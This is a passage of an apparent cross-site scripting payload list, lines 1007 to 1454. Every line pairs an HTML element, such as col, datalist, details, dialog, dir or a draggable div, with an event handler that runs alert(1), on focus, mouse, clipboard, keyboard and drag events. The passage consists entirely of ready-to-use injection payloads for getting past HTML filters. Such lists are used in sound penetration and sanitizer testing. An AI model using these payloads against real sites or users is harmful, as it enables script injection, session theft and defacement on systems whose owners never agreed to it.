1007 | <col id=x tabindex=1 onactivate=alert(1)></col>
1008 | <col id=x tabindex=1 onbeforeactivate=alert(1)></col>
1009 | <col id=x tabindex=1 onbeforedeactivate=alert(1)></col><input autofocus>
1010 | <col id=x tabindex=1 ondeactivate=alert(1)></col><input id=y autofocus>
1011 | <col id=x tabindex=1 onfocus=alert(1)></col>
1012 | <col id=x tabindex=1 onfocusin=alert(1)></col>
1013 | <col onbeforecopy="alert(1)" contenteditable>test</col>
1014 | <col onbeforecut="alert(1)" contenteditable>test</col>
1015 | <col onbeforepaste="alert(1)" contenteditable>test</col>
1016 | <col onblur=alert(1) tabindex=1 id=x></col><input autofocus>
1017 | <col onclick="alert(1)">test</col>
1018 | <col oncontextmenu="alert(1)">test</col>
1019 | <col oncopy="alert(1)" contenteditable>test</col>
1020 | <col oncut="alert(1)" contenteditable>test</col>
1021 | <col ondblclick="alert(1)">test</col>
1022 | <col onfocusout=alert(1) tabindex=1 id=x></col><input autofocus>
1023 | <col onkeydown="alert(1)" contenteditable>test</col>
1024 | <col onkeypress="alert(1)" contenteditable>test</col>
1025 | <col onkeyup="alert(1)" contenteditable>test</col>
1026 | <col onmousedown="alert(1)">test</col>
1027 | <col onmouseenter="alert(1)">test</col>
1028 | <col onmouseleave="alert(1)">test</col>
1029 | <col onmousemove="alert(1)">test</col>
1030 | <col onmouseout="alert(1)">test</col>
1031 | <col onmouseover="alert(1)">test</col>
1032 | <col onmouseup="alert(1)">test</col>
1033 | <col onpaste="alert(1)" contenteditable>test</col>
1034 | <colgroup draggable="true" ondrag="alert(1)">test</colgroup>
1035 | <colgroup draggable="true" ondragend="alert(1)">test</colgroup>
1036 | <colgroup draggable="true" ondragenter="alert(1)">test</colgroup>
1037 | <colgroup draggable="true" ondragleave="alert(1)">test</colgroup>
1038 | <colgroup draggable="true" ondragstart="alert(1)">test</colgroup>
1039 | <colgroup id=x tabindex=1 onactivate=alert(1)></colgroup>
1040 | <colgroup id=x tabindex=1 onbeforeactivate=alert(1)></colgroup>
1041 | <colgroup id=x tabindex=1 onbeforedeactivate=alert(1)></colgroup><input autofocus>
1042 | <colgroup id=x tabindex=1 ondeactivate=alert(1)></colgroup><input id=y autofocus>
1043 | <colgroup id=x tabindex=1 onfocus=alert(1)></colgroup>
1044 | <colgroup id=x tabindex=1 onfocusin=alert(1)></colgroup>
1045 | <colgroup onbeforecopy="alert(1)" contenteditable>test</colgroup>
1046 | <colgroup onbeforecut="alert(1)" contenteditable>test</colgroup>
1047 | <colgroup onbeforepaste="alert(1)" contenteditable>test</colgroup>
1048 | <colgroup onblur=alert(1) tabindex=1 id=x></colgroup><input autofocus>
1049 | <colgroup onclick="alert(1)">test</colgroup>
1050 | <colgroup oncontextmenu="alert(1)">test</colgroup>
1051 | <colgroup oncopy="alert(1)" contenteditable>test</colgroup>
1052 | <colgroup oncut="alert(1)" contenteditable>test</colgroup>
1053 | <colgroup ondblclick="alert(1)">test</colgroup>
1054 | <colgroup onfocusout=alert(1) tabindex=1 id=x></colgroup><input autofocus>
1055 | <colgroup onkeydown="alert(1)" contenteditable>test</colgroup>
1056 | <colgroup onkeypress="alert(1)" contenteditable>test</colgroup>
1057 | <colgroup onkeyup="alert(1)" contenteditable>test</colgroup>
1058 | <colgroup onmousedown="alert(1)">test</colgroup>
1059 | <colgroup onmouseenter="alert(1)">test</colgroup>
1060 | <colgroup onmouseleave="alert(1)">test</colgroup>
1061 | <colgroup onmousemove="alert(1)">test</colgroup>
1062 | <colgroup onmouseout="alert(1)">test</colgroup>
1063 | <colgroup onmouseover="alert(1)">test</colgroup>
1064 | <colgroup onmouseup="alert(1)">test</colgroup>
1065 | <colgroup onpaste="alert(1)" contenteditable>test</colgroup>
1066 | <command draggable="true" ondrag="alert(1)">test</command>
1067 | <command draggable="true" ondragend="alert(1)">test</command>
1068 | <command draggable="true" ondragenter="alert(1)">test</command>
1069 | <command draggable="true" ondragleave="alert(1)">test</command>
1070 | <command draggable="true" ondragstart="alert(1)">test</command>
1071 | <command id=x tabindex=1 onactivate=alert(1)></command>
1072 | <command id=x tabindex=1 onbeforeactivate=alert(1)></command>
1073 | <command id=x tabindex=1 onbeforedeactivate=alert(1)></command><input autofocus>
1074 | <command id=x tabindex=1 ondeactivate=alert(1)></command><input id=y autofocus>
1075 | <command id=x tabindex=1 onfocus=alert(1)></command>
1076 | <command id=x tabindex=1 onfocusin=alert(1)></command>
1077 | <command onbeforecopy="alert(1)" contenteditable>test</command>
1078 | <command onbeforecut="alert(1)" contenteditable>test</command>
1079 | <command onbeforepaste="alert(1)" contenteditable>test</command>
1080 | <command onblur=alert(1) tabindex=1 id=x></command><input autofocus>
1081 | <command onclick="alert(1)">test</command>
1082 | <command oncontextmenu="alert(1)">test</command>
1083 | <command oncopy="alert(1)" contenteditable>test</command>
1084 | <command oncut="alert(1)" contenteditable>test</command>
1085 | <command ondblclick="alert(1)">test</command>
1086 | <command onfocusout=alert(1) tabindex=1 id=x></command><input autofocus>
1087 | <command onkeydown="alert(1)" contenteditable>test</command>
1088 | <command onkeypress="alert(1)" contenteditable>test</command>
1089 | <command onkeyup="alert(1)" contenteditable>test</command>
1090 | <command onmousedown="alert(1)">test</command>
1091 | <command onmouseenter="alert(1)">test</command>
1092 | <command onmouseleave="alert(1)">test</command>
1093 | <command onmousemove="alert(1)">test</command>
1094 | <command onmouseout="alert(1)">test</command>
1095 | <command onmouseover="alert(1)">test</command>
1096 | <command onmouseup="alert(1)">test</command>
1097 | <command onpaste="alert(1)" contenteditable>test</command>
1098 | <content draggable="true" ondrag="alert(1)">test</content>
1099 | <content draggable="true" ondragend="alert(1)">test</content>
1100 | <content draggable="true" ondragenter="alert(1)">test</content>
1101 | <content draggable="true" ondragleave="alert(1)">test</content>
1102 | <content draggable="true" ondragstart="alert(1)">test</content>
1103 | <content id=x tabindex=1 onactivate=alert(1)></content>
1104 | <content id=x tabindex=1 onbeforeactivate=alert(1)></content>
1105 | <content id=x tabindex=1 onbeforedeactivate=alert(1)></content><input autofocus>
1106 | <content id=x tabindex=1 ondeactivate=alert(1)></content><input id=y autofocus>
1107 | <content id=x tabindex=1 onfocus=alert(1)></content>
1108 | <content id=x tabindex=1 onfocusin=alert(1)></content>
1109 | <content onbeforecopy="alert(1)" contenteditable>test</content>
1110 | <content onbeforecut="alert(1)" contenteditable>test</content>
1111 | <content onbeforepaste="alert(1)" contenteditable>test</content>
1112 | <content onblur=alert(1) tabindex=1 id=x></content><input autofocus>
1113 | <content onclick="alert(1)">test</content>
1114 | <content oncontextmenu="alert(1)">test</content>
1115 | <content oncopy="alert(1)" contenteditable>test</content>
1116 | <content oncut="alert(1)" contenteditable>test</content>
1117 | <content ondblclick="alert(1)">test</content>
1118 | <content onfocusout=alert(1) tabindex=1 id=x></content><input autofocus>
1119 | <content onkeydown="alert(1)" contenteditable>test</content>
1120 | <content onkeypress="alert(1)" contenteditable>test</content>
1121 | <content onkeyup="alert(1)" contenteditable>test</content>
1122 | <content onmousedown="alert(1)">test</content>
1123 | <content onmouseenter="alert(1)">test</content>
1124 | <content onmouseleave="alert(1)">test</content>
1125 | <content onmousemove="alert(1)">test</content>
1126 | <content onmouseout="alert(1)">test</content>
1127 | <content onmouseover="alert(1)">test</content>
1128 | <content onmouseup="alert(1)">test</content>
1129 | <content onpaste="alert(1)" contenteditable>test</content>
1130 | <data draggable="true" ondrag="alert(1)">test</data>
1131 | <data draggable="true" ondragend="alert(1)">test</data>
1132 | <data draggable="true" ondragenter="alert(1)">test</data>
1133 | <data draggable="true" ondragleave="alert(1)">test</data>
1134 | <data draggable="true" ondragstart="alert(1)">test</data>
1135 | <data id=x tabindex=1 onactivate=alert(1)></data>
1136 | <data id=x tabindex=1 onbeforeactivate=alert(1)></data>
1137 | <data id=x tabindex=1 onbeforedeactivate=alert(1)></data><input autofocus>
1138 | <data id=x tabindex=1 ondeactivate=alert(1)></data><input id=y autofocus>
1139 | <data id=x tabindex=1 onfocus=alert(1)></data>
1140 | <data id=x tabindex=1 onfocusin=alert(1)></data>
1141 | <data onbeforecopy="alert(1)" contenteditable>test</data>
1142 | <data onbeforecut="alert(1)" contenteditable>test</data>
1143 | <data onbeforepaste="alert(1)" contenteditable>test</data>
1144 | <data onblur=alert(1) tabindex=1 id=x></data><input autofocus>
1145 | <data onclick="alert(1)">test</data>
1146 | <data oncontextmenu="alert(1)">test</data>
1147 | <data oncopy="alert(1)" contenteditable>test</data>
1148 | <data oncut="alert(1)" contenteditable>test</data>
1149 | <data ondblclick="alert(1)">test</data>
1150 | <data onfocusout=alert(1) tabindex=1 id=x></data><input autofocus>
1151 | <data onkeydown="alert(1)" contenteditable>test</data>
1152 | <data onkeypress="alert(1)" contenteditable>test</data>
1153 | <data onkeyup="alert(1)" contenteditable>test</data>
1154 | <data onmousedown="alert(1)">test</data>
1155 | <data onmouseenter="alert(1)">test</data>
1156 | <data onmouseleave="alert(1)">test</data>
1157 | <data onmousemove="alert(1)">test</data>
1158 | <data onmouseout="alert(1)">test</data>
1159 | <data onmouseover="alert(1)">test</data>
1160 | <data onmouseup="alert(1)">test</data>
1161 | <data onpaste="alert(1)" contenteditable>test</data>
1162 | <datalist draggable="true" ondrag="alert(1)">test</datalist>
1163 | <datalist draggable="true" ondragend="alert(1)">test</datalist>
1164 | <datalist draggable="true" ondragenter="alert(1)">test</datalist>
1165 | <datalist draggable="true" ondragleave="alert(1)">test</datalist>
1166 | <datalist draggable="true" ondragstart="alert(1)">test</datalist>
1167 | <datalist id=x tabindex=1 onactivate=alert(1)></datalist>
1168 | <datalist id=x tabindex=1 onbeforeactivate=alert(1)></datalist>
1169 | <datalist id=x tabindex=1 onbeforedeactivate=alert(1)></datalist><input autofocus>
1170 | <datalist id=x tabindex=1 ondeactivate=alert(1)></datalist><input id=y autofocus>
1171 | <datalist id=x tabindex=1 onfocus=alert(1)></datalist>
1172 | <datalist id=x tabindex=1 onfocusin=alert(1)></datalist>
1173 | <datalist onbeforecopy="alert(1)" contenteditable>test</datalist>
1174 | <datalist onbeforecut="alert(1)" contenteditable>test</datalist>
1175 | <datalist onbeforepaste="alert(1)" contenteditable>test</datalist>
1176 | <datalist onblur=alert(1) tabindex=1 id=x></datalist><input autofocus>
1177 | <datalist onclick="alert(1)">test</datalist>
1178 | <datalist oncontextmenu="alert(1)">test</datalist>
1179 | <datalist oncopy="alert(1)" contenteditable>test</datalist>
1180 | <datalist oncut="alert(1)" contenteditable>test</datalist>
1181 | <datalist ondblclick="alert(1)">test</datalist>
1182 | <datalist onfocusout=alert(1) tabindex=1 id=x></datalist><input autofocus>
1183 | <datalist onkeydown="alert(1)" contenteditable>test</datalist>
1184 | <datalist onkeypress="alert(1)" contenteditable>test</datalist>
1185 | <datalist onkeyup="alert(1)" contenteditable>test</datalist>
1186 | <datalist onmousedown="alert(1)">test</datalist>
1187 | <datalist onmouseenter="alert(1)">test</datalist>
1188 | <datalist onmouseleave="alert(1)">test</datalist>
1189 | <datalist onmousemove="alert(1)">test</datalist>
1190 | <datalist onmouseout="alert(1)">test</datalist>
1191 | <datalist onmouseover="alert(1)">test</datalist>
1192 | <datalist onmouseup="alert(1)">test</datalist>
1193 | <datalist onpaste="alert(1)" contenteditable>test</datalist>
1194 | <dd draggable="true" ondrag="alert(1)">test</dd>
1195 | <dd draggable="true" ondragend="alert(1)">test</dd>
1196 | <dd draggable="true" ondragenter="alert(1)">test</dd>
1197 | <dd draggable="true" ondragleave="alert(1)">test</dd>
1198 | <dd draggable="true" ondragstart="alert(1)">test</dd>
1199 | <dd id=x tabindex=1 onactivate=alert(1)></dd>
1200 | <dd id=x tabindex=1 onbeforeactivate=alert(1)></dd>
1201 | <dd id=x tabindex=1 onbeforedeactivate=alert(1)></dd><input autofocus>
1202 | <dd id=x tabindex=1 ondeactivate=alert(1)></dd><input id=y autofocus>
1203 | <dd id=x tabindex=1 onfocus=alert(1)></dd>
1204 | <dd id=x tabindex=1 onfocusin=alert(1)></dd>
1205 | <dd onbeforecopy="alert(1)" contenteditable>test</dd>
1206 | <dd onbeforecut="alert(1)" contenteditable>test</dd>
1207 | <dd onbeforepaste="alert(1)" contenteditable>test</dd>
1208 | <dd onblur=alert(1) tabindex=1 id=x></dd><input autofocus>
1209 | <dd onclick="alert(1)">test</dd>
1210 | <dd oncontextmenu="alert(1)">test</dd>
1211 | <dd oncopy="alert(1)" contenteditable>test</dd>
1212 | <dd oncut="alert(1)" contenteditable>test</dd>
1213 | <dd ondblclick="alert(1)">test</dd>
1214 | <dd onfocusout=alert(1) tabindex=1 id=x></dd><input autofocus>
1215 | <dd onkeydown="alert(1)" contenteditable>test</dd>
1216 | <dd onkeypress="alert(1)" contenteditable>test</dd>
1217 | <dd onkeyup="alert(1)" contenteditable>test</dd>
1218 | <dd onmousedown="alert(1)">test</dd>
1219 | <dd onmouseenter="alert(1)">test</dd>
1220 | <dd onmouseleave="alert(1)">test</dd>
1221 | <dd onmousemove="alert(1)">test</dd>
1222 | <dd onmouseout="alert(1)">test</dd>
1223 | <dd onmouseover="alert(1)">test</dd>
1224 | <dd onmouseup="alert(1)">test</dd>
1225 | <dd onpaste="alert(1)" contenteditable>test</dd>
1226 | <del draggable="true" ondrag="alert(1)">test</del>
1227 | <del draggable="true" ondragend="alert(1)">test</del>
1228 | <del draggable="true" ondragenter="alert(1)">test</del>
1229 | <del draggable="true" ondragleave="alert(1)">test</del>
1230 | <del draggable="true" ondragstart="alert(1)">test</del>
1231 | <del id=x tabindex=1 onactivate=alert(1)></del>
1232 | <del id=x tabindex=1 onbeforeactivate=alert(1)></del>
1233 | <del id=x tabindex=1 onbeforedeactivate=alert(1)></del><input autofocus>
1234 | <del id=x tabindex=1 ondeactivate=alert(1)></del><input id=y autofocus>
1235 | <del id=x tabindex=1 onfocus=alert(1)></del>
1236 | <del id=x tabindex=1 onfocusin=alert(1)></del>
1237 | <del onbeforecopy="alert(1)" contenteditable>test</del>
1238 | <del onbeforecut="alert(1)" contenteditable>test</del>
1239 | <del onbeforepaste="alert(1)" contenteditable>test</del>
1240 | <del onblur=alert(1) tabindex=1 id=x></del><input autofocus>
1241 | <del onclick="alert(1)">test</del>
1242 | <del oncontextmenu="alert(1)">test</del>
1243 | <del oncopy="alert(1)" contenteditable>test</del>
1244 | <del oncut="alert(1)" contenteditable>test</del>
1245 | <del ondblclick="alert(1)">test</del>
1246 | <del onfocusout=alert(1) tabindex=1 id=x></del><input autofocus>
1247 | <del onkeydown="alert(1)" contenteditable>test</del>
1248 | <del onkeypress="alert(1)" contenteditable>test</del>
1249 | <del onkeyup="alert(1)" contenteditable>test</del>
1250 | <del onmousedown="alert(1)">test</del>
1251 | <del onmouseenter="alert(1)">test</del>
1252 | <del onmouseleave="alert(1)">test</del>
1253 | <del onmousemove="alert(1)">test</del>
1254 | <del onmouseout="alert(1)">test</del>
1255 | <del onmouseover="alert(1)">test</del>
1256 | <del onmouseup="alert(1)">test</del>
1257 | <del onpaste="alert(1)" contenteditable>test</del>
1258 | <details draggable="true" ondrag="alert(1)">test</details>
1259 | <details draggable="true" ondragend="alert(1)">test</details>
1260 | <details draggable="true" ondragenter="alert(1)">test</details>
1261 | <details draggable="true" ondragleave="alert(1)">test</details>
1262 | <details draggable="true" ondragstart="alert(1)">test</details>
1263 | <details id=x tabindex=1 onactivate=alert(1)></details>
1264 | <details id=x tabindex=1 onbeforeactivate=alert(1)></details>
1265 | <details id=x tabindex=1 onbeforedeactivate=alert(1)></details><input autofocus>
1266 | <details id=x tabindex=1 ondeactivate=alert(1)></details><input id=y autofocus>
1267 | <details id=x tabindex=1 onfocus=alert(1)></details>
1268 | <details id=x tabindex=1 onfocusin=alert(1)></details>
1269 | <details onbeforecopy="alert(1)" contenteditable>test</details>
1270 | <details onbeforecut="alert(1)" contenteditable>test</details>
1271 | <details onbeforepaste="alert(1)" contenteditable>test</details>
1272 | <details onblur=alert(1) tabindex=1 id=x></details><input autofocus>
1273 | <details onclick="alert(1)">test</details>
1274 | <details oncontextmenu="alert(1)">test</details>
1275 | <details oncopy="alert(1)" contenteditable>test</details>
1276 | <details oncut="alert(1)" contenteditable>test</details>
1277 | <details ondblclick="alert(1)">test</details>
1278 | <details onfocusout=alert(1) tabindex=1 id=x></details><input autofocus>
1279 | <details onkeydown="alert(1)" contenteditable>test</details>
1280 | <details onkeypress="alert(1)" contenteditable>test</details>
1281 | <details onkeyup="alert(1)" contenteditable>test</details>
1282 | <details onmousedown="alert(1)">test</details>
1283 | <details onmouseenter="alert(1)">test</details>
1284 | <details onmouseleave="alert(1)">test</details>
1285 | <details onmousemove="alert(1)">test</details>
1286 | <details onmouseout="alert(1)">test</details>
1287 | <details onmouseover="alert(1)">test</details>
1288 | <details onmouseup="alert(1)">test</details>
1289 | <details onpaste="alert(1)" contenteditable>test</details>
1290 | <details ontoggle=alert(1) open>test</details>
1291 | <dfn draggable="true" ondrag="alert(1)">test</dfn>
1292 | <dfn draggable="true" ondragend="alert(1)">test</dfn>
1293 | <dfn draggable="true" ondragenter="alert(1)">test</dfn>
1294 | <dfn draggable="true" ondragleave="alert(1)">test</dfn>
1295 | <dfn draggable="true" ondragstart="alert(1)">test</dfn>
1296 | <dfn id=x tabindex=1 onactivate=alert(1)></dfn>
1297 | <dfn id=x tabindex=1 onbeforeactivate=alert(1)></dfn>
1298 | <dfn id=x tabindex=1 onbeforedeactivate=alert(1)></dfn><input autofocus>
1299 | <dfn id=x tabindex=1 ondeactivate=alert(1)></dfn><input id=y autofocus>
1300 | <dfn id=x tabindex=1 onfocus=alert(1)></dfn>
1301 | <dfn id=x tabindex=1 onfocusin=alert(1)></dfn>
1302 | <dfn onbeforecopy="alert(1)" contenteditable>test</dfn>
1303 | <dfn onbeforecut="alert(1)" contenteditable>test</dfn>
1304 | <dfn onbeforepaste="alert(1)" contenteditable>test</dfn>
1305 | <dfn onblur=alert(1) tabindex=1 id=x></dfn><input autofocus>
1306 | <dfn onclick="alert(1)">test</dfn>
1307 | <dfn oncontextmenu="alert(1)">test</dfn>
1308 | <dfn oncopy="alert(1)" contenteditable>test</dfn>
1309 | <dfn oncut="alert(1)" contenteditable>test</dfn>
1310 | <dfn ondblclick="alert(1)">test</dfn>
1311 | <dfn onfocusout=alert(1) tabindex=1 id=x></dfn><input autofocus>
1312 | <dfn onkeydown="alert(1)" contenteditable>test</dfn>
1313 | <dfn onkeypress="alert(1)" contenteditable>test</dfn>
1314 | <dfn onkeyup="alert(1)" contenteditable>test</dfn>
1315 | <dfn onmousedown="alert(1)">test</dfn>
1316 | <dfn onmouseenter="alert(1)">test</dfn>
1317 | <dfn onmouseleave="alert(1)">test</dfn>
1318 | <dfn onmousemove="alert(1)">test</dfn>
1319 | <dfn onmouseout="alert(1)">test</dfn>
1320 | <dfn onmouseover="alert(1)">test</dfn>
1321 | <dfn onmouseup="alert(1)">test</dfn>
1322 | <dfn onpaste="alert(1)" contenteditable>test</dfn>
1323 | <dialog draggable="true" ondrag="alert(1)">test</dialog>
1324 | <dialog draggable="true" ondragend="alert(1)">test</dialog>
1325 | <dialog draggable="true" ondragenter="alert(1)">test</dialog>
1326 | <dialog draggable="true" ondragleave="alert(1)">test</dialog>
1327 | <dialog draggable="true" ondragstart="alert(1)">test</dialog>
1328 | <dialog id=x tabindex=1 onactivate=alert(1)></dialog>
1329 | <dialog id=x tabindex=1 onbeforeactivate=alert(1)></dialog>
1330 | <dialog id=x tabindex=1 onbeforedeactivate=alert(1)></dialog><input autofocus>
1331 | <dialog id=x tabindex=1 ondeactivate=alert(1)></dialog><input id=y autofocus>
1332 | <dialog id=x tabindex=1 onfocus=alert(1)></dialog>
1333 | <dialog id=x tabindex=1 onfocusin=alert(1)></dialog>
1334 | <dialog onbeforecopy="alert(1)" contenteditable>test</dialog>
1335 | <dialog onbeforecut="alert(1)" contenteditable>test</dialog>
1336 | <dialog onbeforepaste="alert(1)" contenteditable>test</dialog>
1337 | <dialog onblur=alert(1) tabindex=1 id=x></dialog><input autofocus>
1338 | <dialog onclick="alert(1)">test</dialog>
1339 | <dialog oncontextmenu="alert(1)">test</dialog>
1340 | <dialog oncopy="alert(1)" contenteditable>test</dialog>
1341 | <dialog oncut="alert(1)" contenteditable>test</dialog>
1342 | <dialog ondblclick="alert(1)">test</dialog>
1343 | <dialog onfocusout=alert(1) tabindex=1 id=x></dialog><input autofocus>
1344 | <dialog onkeydown="alert(1)" contenteditable>test</dialog>
1345 | <dialog onkeypress="alert(1)" contenteditable>test</dialog>
1346 | <dialog onkeyup="alert(1)" contenteditable>test</dialog>
1347 | <dialog onmousedown="alert(1)">test</dialog>
1348 | <dialog onmouseenter="alert(1)">test</dialog>
1349 | <dialog onmouseleave="alert(1)">test</dialog>
1350 | <dialog onmousemove="alert(1)">test</dialog>
1351 | <dialog onmouseout="alert(1)">test</dialog>
1352 | <dialog onmouseover="alert(1)">test</dialog>
1353 | <dialog onmouseup="alert(1)">test</dialog>
1354 | <dialog onpaste="alert(1)" contenteditable>test</dialog>
1355 | <dir draggable="true" ondrag="alert(1)">test</dir>
1356 | <dir draggable="true" ondragend="alert(1)">test</dir>
1357 | <dir draggable="true" ondragenter="alert(1)">test</dir>
1358 | <dir draggable="true" ondragleave="alert(1)">test</dir>
1359 | <dir draggable="true" ondragstart="alert(1)">test</dir>
1360 | <dir id=x tabindex=1 onactivate=alert(1)></dir>
1361 | <dir id=x tabindex=1 onbeforeactivate=alert(1)></dir>
1362 | <dir id=x tabindex=1 onbeforedeactivate=alert(1)></dir><input autofocus>
1363 | <dir id=x tabindex=1 ondeactivate=alert(1)></dir><input id=y autofocus>
1364 | <dir id=x tabindex=1 onfocus=alert(1)></dir>
1365 | <dir id=x tabindex=1 onfocusin=alert(1)></dir>
1366 | <dir onbeforecopy="alert(1)" contenteditable>test</dir>
1367 | <dir onbeforecut="alert(1)" contenteditable>test</dir>
1368 | <dir onbeforepaste="alert(1)" contenteditable>test</dir>
1369 | <dir onblur=alert(1) tabindex=1 id=x></dir><input autofocus>
1370 | <dir onclick="alert(1)">test</dir>
1371 | <dir oncontextmenu="alert(1)">test</dir>
1372 | <dir oncopy="alert(1)" contenteditable>test</dir>
1373 | <dir oncut="alert(1)" contenteditable>test</dir>
1374 | <dir ondblclick="alert(1)">test</dir>
1375 | <dir onfocusout=alert(1) tabindex=1 id=x></dir><input autofocus>
1376 | <dir onkeydown="alert(1)" contenteditable>test</dir>
1377 | <dir onkeypress="alert(1)" contenteditable>test</dir>
1378 | <dir onkeyup="alert(1)" contenteditable>test</dir>
1379 | <dir onmousedown="alert(1)">test</dir>
1380 | <dir onmouseenter="alert(1)">test</dir>
1381 | <dir onmouseleave="alert(1)">test</dir>
1382 | <dir onmousemove="alert(1)">test</dir>
1383 | <dir onmouseout="alert(1)">test</dir>
1384 | <dir onmouseover="alert(1)">test</dir>
1385 | <dir onmouseup="alert(1)">test</dir>
1386 | <dir onpaste="alert(1)" contenteditable>test</dir>
1387 | <div draggable="true" contenteditable>drag me</div><a ondragover=alert(1) contenteditable>drop here</a>
1388 | <div draggable="true" contenteditable>drag me</div><a ondrop=alert(1) contenteditable>drop here</a>
1389 | <div draggable="true" contenteditable>drag me</div><abbr ondragover=alert(1) contenteditable>drop here</abbr>
1390 | <div draggable="true" contenteditable>drag me</div><abbr ondrop=alert(1) contenteditable>drop here</abbr>
1391 | <div draggable="true" contenteditable>drag me</div><acronym ondragover=alert(1) contenteditable>drop here</acronym>
1392 | <div draggable="true" contenteditable>drag me</div><acronym ondrop=alert(1) contenteditable>drop here</acronym>
1393 | <div draggable="true" contenteditable>drag me</div><address ondragover=alert(1) contenteditable>drop here</address>
1394 | <div draggable="true" contenteditable>drag me</div><address ondrop=alert(1) contenteditable>drop here</address>
1395 | <div draggable="true" contenteditable>drag me</div><applet ondragover=alert(1) contenteditable>drop here</applet>
1396 | <div draggable="true" contenteditable>drag me</div><applet ondrop=alert(1) contenteditable>drop here</applet>
1397 | <div draggable="true" contenteditable>drag me</div><area ondragover=alert(1) contenteditable>drop here</area>
1398 | <div draggable="true" contenteditable>drag me</div><area ondrop=alert(1) contenteditable>drop here</area>
1399 | <div draggable="true" contenteditable>drag me</div><article ondragover=alert(1) contenteditable>drop here</article>
1400 | <div draggable="true" contenteditable>drag me</div><article ondrop=alert(1) contenteditable>drop here</article>
1401 | <div draggable="true" contenteditable>drag me</div><aside ondragover=alert(1) contenteditable>drop here</aside>
1402 | <div draggable="true" contenteditable>drag me</div><aside ondrop=alert(1) contenteditable>drop here</aside>
1403 | <div draggable="true" contenteditable>drag me</div><audio ondragover=alert(1) contenteditable>drop here</audio>
1404 | <div draggable="true" contenteditable>drag me</div><audio ondrop=alert(1) contenteditable>drop here</audio>
1405 | <div draggable="true" contenteditable>drag me</div><b ondragover=alert(1) contenteditable>drop here</b>
1406 | <div draggable="true" contenteditable>drag me</div><b ondrop=alert(1) contenteditable>drop here</b>
1407 | <div draggable="true" contenteditable>drag me</div><base ondragover=alert(1) contenteditable>drop here</base>
1408 | <div draggable="true" contenteditable>drag me</div><base ondrop=alert(1) contenteditable>drop here</base>
1409 | <div draggable="true" contenteditable>drag me</div><basefont ondragover=alert(1) contenteditable>drop here</basefont>
1410 | <div draggable="true" contenteditable>drag me</div><basefont ondrop=alert(1) contenteditable>drop here</basefont>
1411 | <div draggable="true" contenteditable>drag me</div><bdi ondragover=alert(1) contenteditable>drop here</bdi>
1412 | <div draggable="true" contenteditable>drag me</div><bdi ondrop=alert(1) contenteditable>drop here</bdi>
1413 | <div draggable="true" contenteditable>drag me</div><bdo ondragover=alert(1) contenteditable>drop here</bdo>
1414 | <div draggable="true" contenteditable>drag me</div><bdo ondrop=alert(1) contenteditable>drop here</bdo>
1415 | <div draggable="true" contenteditable>drag me</div><bgsound ondragover=alert(1) contenteditable>drop here</bgsound>
1416 | <div draggable="true" contenteditable>drag me</div><bgsound ondrop=alert(1) contenteditable>drop here</bgsound>
1417 | <div draggable="true" contenteditable>drag me</div><big ondragover=alert(1) contenteditable>drop here</big>
1418 | <div draggable="true" contenteditable>drag me</div><big ondrop=alert(1) contenteditable>drop here</big>
1419 | <div draggable="true" contenteditable>drag me</div><blink ondragover=alert(1) contenteditable>drop here</blink>
1420 | <div draggable="true" contenteditable>drag me</div><blink ondrop=alert(1) contenteditable>drop here</blink>
1421 | <div draggable="true" contenteditable>drag me</div><blockquote ondragover=alert(1) contenteditable>drop here</blockquote>
1422 | <div draggable="true" contenteditable>drag me</div><blockquote ondrop=alert(1) contenteditable>drop here</blockquote>
1423 | <div draggable="true" contenteditable>drag me</div><body ondragover=alert(1) contenteditable>drop here</body>
1424 | <div draggable="true" contenteditable>drag me</div><body ondrop=alert(1) contenteditable>drop here</body>
1425 | <div draggable="true" contenteditable>drag me</div><br ondragover=alert(1) contenteditable>drop here</br>
1426 | <div draggable="true" contenteditable>drag me</div><br ondrop=alert(1) contenteditable>drop here</br>
1427 | <div draggable="true" contenteditable>drag me</div><button ondragover=alert(1) contenteditable>drop here</button>
1428 | <div draggable="true" contenteditable>drag me</div><button ondrop=alert(1) contenteditable>drop here</button>
1429 | <div draggable="true" contenteditable>drag me</div><canvas ondragover=alert(1) contenteditable>drop here</canvas>
1430 | <div draggable="true" contenteditable>drag me</div><canvas ondrop=alert(1) contenteditable>drop here</canvas>
1431 | <div draggable="true" contenteditable>drag me</div><caption ondragover=alert(1) contenteditable>drop here</caption>
1432 | <div draggable="true" contenteditable>drag me</div><caption ondrop=alert(1) contenteditable>drop here</caption>
1433 | <div draggable="true" contenteditable>drag me</div><center ondragover=alert(1) contenteditable>drop here</center>
1434 | <div draggable="true" contenteditable>drag me</div><center ondrop=alert(1) contenteditable>drop here</center>
1435 | <div draggable="true" contenteditable>drag me</div><cite ondragover=alert(1) contenteditable>drop here</cite>
1436 | <div draggable="true" contenteditable>drag me</div><cite ondrop=alert(1) contenteditable>drop here</cite>
1437 | <div draggable="true" contenteditable>drag me</div><code ondragover=alert(1) contenteditable>drop here</code>
1438 | <div draggable="true" contenteditable>drag me</div><code ondrop=alert(1) contenteditable>drop here</code>
1439 | <div draggable="true" contenteditable>drag me</div><col ondragover=alert(1) contenteditable>drop here</col>
1440 | <div draggable="true" contenteditable>drag me</div><col ondrop=alert(1) contenteditable>drop here</col>
1441 | <div draggable="true" contenteditable>drag me</div><colgroup ondragover=alert(1) contenteditable>drop here</colgroup>
1442 | <div draggable="true" contenteditable>drag me</div><colgroup ondrop=alert(1) contenteditable>drop here</colgroup>
1443 | <div draggable="true" contenteditable>drag me</div><command ondragover=alert(1) contenteditable>drop here</command>
1444 | <div draggable="true" contenteditable>drag me</div><command ondrop=alert(1) contenteditable>drop here</command>
1445 | <div draggable="true" contenteditable>drag me</div><content ondragover=alert(1) contenteditable>drop here</content>
1446 | <div draggable="true" contenteditable>drag me</div><content ondrop=alert(1) contenteditable>drop here</content>
1447 | <div draggable="true" contenteditable>drag me</div><data ondragover=alert(1) contenteditable>drop here</data>
1448 | <div draggable="true" contenteditable>drag me</div><data ondrop=alert(1) contenteditable>drop here</data>
1449 | <div draggable="true" contenteditable>drag me</div><datalist ondragover=alert(1) contenteditable>drop here</datalist>
1450 | <div draggable="true" contenteditable>drag me</div><datalist ondrop=alert(1) contenteditable>drop here</datalist>
1451 | <div draggable="true" contenteditable>drag me</div><dd ondragover=alert(1) contenteditable>drop here</dd>
1452 | <div draggable="true" contenteditable>drag me</div><dd ondrop=alert(1) contenteditable>drop here</dd>
1453 | <div draggable="true" contenteditable>drag me</div><del ondragover=alert(1) contenteditable>drop here</del>
1454 | <div draggable="true" contenteditable>drag me</div><del ondrop=alert(1) contenteditable>drop here</del>
